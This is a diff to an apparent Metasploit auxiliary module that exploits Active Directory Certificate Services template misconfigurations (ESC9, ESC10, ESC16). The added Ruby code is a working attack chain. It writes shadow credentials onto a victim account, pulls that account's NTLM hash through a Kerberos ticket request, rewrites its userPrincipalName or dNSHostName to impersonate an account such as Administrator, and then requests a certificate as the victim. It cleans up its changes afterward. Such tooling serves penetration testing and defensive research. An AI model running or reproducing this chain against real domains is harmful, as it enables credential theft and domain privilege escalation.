@@ -19,10 +19,15 @@ class MetasploitModule < Msf::Auxiliary
         info,
         'Name' => 'Exploits AD CS Template misconfigurations which involve updating an LDAP object: ESC9, ESC10, and ESC16',
         'Description' => %q{
-          This module updates an LDAP object with a new value before requesting a certificate.
-          Request certificates via MS-ICPR (Active Directory Certificate Services). Depending on the certificate
-          template's configuration the resulting certificate can be used for various operations such as authentication.
-          PFX certificate files that are saved are encrypted with a blank password.
+          This module exploits Active Directory Certificate Services (AD CS) template misconfigurations, specifically
+          ESC9, ESC10, and ESC16, by updating an LDAP object and requesting a certificate on behalf of a target user.
+          The module leverages the auxiliary/admin/ldap/ldap_object_attribute module to update the LDAP object and the
+          admin/ldap/shadow_credentials module to add shadow credentials for the target user. It then uses the
+          admin/kerberos/get_ticket module to retrieve the NTLM hash of the target user and requests a certificate via
+          MS-ICPR. The resulting certificate can be used for various operations, such as authentication.
+
+          The module ensures that any changes made by the ldap_object_attribute or shadow_credentials module are
+          reverted after execution to maintain system integrity.
         },
         'License' => MSF_LICENSE,
         'Author' => [
@@ -35,7 +40,8 @@ class MetasploitModule < Msf::Auxiliary
         'References' => [
           [ 'URL', 'https://github.com/GhostPack/Certify' ],
           [ 'URL', 'https://github.com/ly4k/Certipy' ],
-          [ 'URL', 'https://medium.com/@offsecdeer/adcs-exploitation-series-part-2-certificate-mapping-esc15-6e19a6037760' ]
+          [ 'URL', 'https://medium.com/@offsecdeer/adcs-exploitation-series-part-2-certificate-mapping-esc15-6e19a6037760' ],
+          [ 'URL', 'https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc16-a-compatibility-mode' ]
         ],
         'Notes' => {
           'Reliability' => [],
@@ -54,7 +60,8 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options([
       OptEnum.new('UPDATE_LDAP_OBJECT', [ true, 'Either userPrincipalName or dNSHostName, Updates the necessary object of a specific user before requesting the cert.', 'userPrincipalName', %w[userPrincipalName dNSHostName] ]),
-      OptString.new('TARGET_USERNAME', [true, 'The username of the target LDAP object.'])
+      OptString.new('UPDATE_LDAP_OBJECT_VALUE', [ true, 'The account name you wish to impersonate', 'Administrator']),
+      OptString.new('TARGET_USERNAME', [true, 'The username of the target LDAP object (the victim account).'])
     ])
 
     register_advanced_options(
@@ -113,24 +120,108 @@ class MetasploitModule < Msf::Auxiliary
     )
   end
 
-  def action_request_cert
-    if datastore['UPDATE_LDAP_OBJECT'] == 'userPrincipalName'
-      new_value = datastore['ALT_UPN'].split('@').first
-      fail_with(Failure::BadConfig, 'The ALT_UPN option must be set for userPrincipalName updates.') unless datastore['ALT_UPN'].present?
-      fail_with(Failure::BadConfig, 'The ALT_DNS should not be set if UPDATE_LDAP_OBJECT is set to userPrincipalName.') if datastore['ALT_DNS'].present?
-    elsif datastore['UPDATE_LDAP_OBJECT'] == 'dNSHostName'
-      new_value = datastore['ALT_DNS']
-      fail_with(Failure::BadConfig, 'The ALT_DNS option must be set for userPrincipalName updates.') unless datastore['ALT_DNS'].present?
-      fail_with(Failure::BadConfig, 'The ALT_UPN should not be set if UPDATE_LDAP_OBJECT is set to dNSHostName.') if datastore['ALT_UPN'].present?
+  def call_shadow_credentials_module(action, device_id = nil)
+    mod_refname = 'admin/ldap/shadow_credentials'
+
+    print_status("Loading #{mod_refname}")
+    ldap_update_module = framework.modules.create(mod_refname)
+
+    unless ldap_update_module
+      print_error("Failed to load module: #{mod_refname}")
+      return
     end
+
+    # Default to using the SMB credentials if LDAP credentials are not provided
+    ldap_update_module = framework.modules.create(mod_refname)
+    ldap_update_module.datastore['RHOST'] = datastore['RHOST']
+    ldap_update_module.datastore['RPORT'] = datastore['LDAPRport']
+    ldap_update_module.datastore['VERBOSE'] = datastore['VERBOSE']
+    ldap_update_module.datastore['LDAPDomain'] = datastore['LDAPDomain'] || datastore['SMBDomain']
+    ldap_update_module.datastore['LDAPUsername'] = datastore['LDAPUsername'] || datastore['SMBUser']
+    ldap_update_module.datastore['LDAPPassword'] = datastore['LDAPPassword'] || datastore['SMBPass']
+    ldap_update_module.datastore['TARGET_USER'] = datastore['TARGET_USERNAME']
+    ldap_update_module.datastore['DEVICE_ID'] = device_id[:device_id] if action == 'remove' && device_id.present?
+    ldap_update_module.datastore['ACTION'] = action
+
+    print_status("Running #{mod_refname}")
+    ldap_update_module.run_simple(
+      'LocalInput' => user_input,
+      'LocalOutput' => user_output,
+      'RunAsJob' => false
+    )
+  end
+
+  def automate_get_hash(cert_path, username, domain, rhosts)
+    mod_refname = 'admin/kerberos/get_ticket'
+
+    print_status("Loading #{mod_refname}")
+    get_ticket_module = framework.modules.create(mod_refname)
+
+    unless get_ticket_module
+      print_error("Failed to load module: #{mod_refname}")
+      return
+    end
+
+    print_status("Getting hash for #{username}")
+    get_ticket_module.datastore['CERT_FILE'] = cert_path
+    get_ticket_module.datastore['USERNAME'] = username
+    get_ticket_module.datastore['DOMAIN'] = domain
+    get_ticket_module.datastore['RHOSTS'] = rhosts
+    get_ticket_module.datastore['RPORT'] = 88
+    get_ticket_module.datastore['ACTION'] = 'GET_HASH'
+
+    res = get_ticket_module.run_simple(
+      'LocalInput' => user_input,
+      'LocalOutput' => user_output,
+      'RunAsJob' => false
+    )
+    fail_with(Failure::Unknown, "Failed to get hash for target user") unless res
+    res
+  end
+
+  def action_request_cert
+    new_value = datastore['UPDATE_LDAP_OBJECT_VALUE']
     # Get the original while updating (the update action returns the original value upon success)
     @original_value = call_ldap_object_module('UPDATE', new_value)
+    fail_with(Failure::BadConfig,"The #{datastore['UPDATE_LDAP_OBJECT']} of #{datastore['TARGET_USERNAME']} is already set to #{datastore['UPDATE_LDAP_OBJECT_VALUE']}. After the module completes running it will revert the attribute to it's original value which will cause the certificate produced to throw a KDC_ERR_CLIENT_NAME_MISMATCH when attempting to use it. Try setting the #{datastore['UPDATE_LDAP_OBJECT']} of #{datastore['TARGET_USERNAME']} to anything but #{datastore['UPDATE_LDAP_OBJECT_VALUE']} using the ldap_object_attribute module and then rerun this module.") if @original_value.present? && @original_value.casecmp?(datastore['UPDATE_LDAP_OBJECT_VALUE'])
 
+    # Call the shadow credentials module to add the device and get the cert path
+    print_status("Adding shadow credentials for #{datastore['TARGET_USERNAME']}")
+    @device_id, cert_path = call_shadow_credentials_module('add')
+    domain = datastore['LDAPDomain'] || datastore['SMBDomain']
+    hash = automate_get_hash(cert_path, datastore['TARGET_USERNAME'], domain, datastore['RHOSTS'])
     with_ipc_tree do |opts|
+      # We need to now request the certificate as the target user. We need to change
+      save_auth_datastore_options
+      datastore['SMBUser'] = datastore['TARGET_USERNAME']
+      datastore['SMBPass'] = hash
       request_certificate(opts)
     end
   ensure
+    restore_auth_datastore_options
+    print_status("Removing shadow credential")
+    call_shadow_credentials_module('remove', device_id: @device_id)
+    print_status("Reverting ldap object")
     revert_ldap_object
+  end
+
+  def save_auth_datastore_options
+    @saved_datastore_options = {}
+    datastore.each do |key, value|
+      next unless key == 'SMBPass' || key == 'SMBUser' || key == 'LDAPUsername' || key == 'LDAPPassword'
+      if value.present?
+        @saved_datastore_options[key] = value
+        datastore[key] = ''
+      end
+    end
+  end
+
+  def restore_auth_datastore_options
+    return unless @saved_datastore_options
+
+    @saved_datastore_options.each do |key, value|
+      datastore[key] = value
+    end
   end
 
   def revert_ldap_object
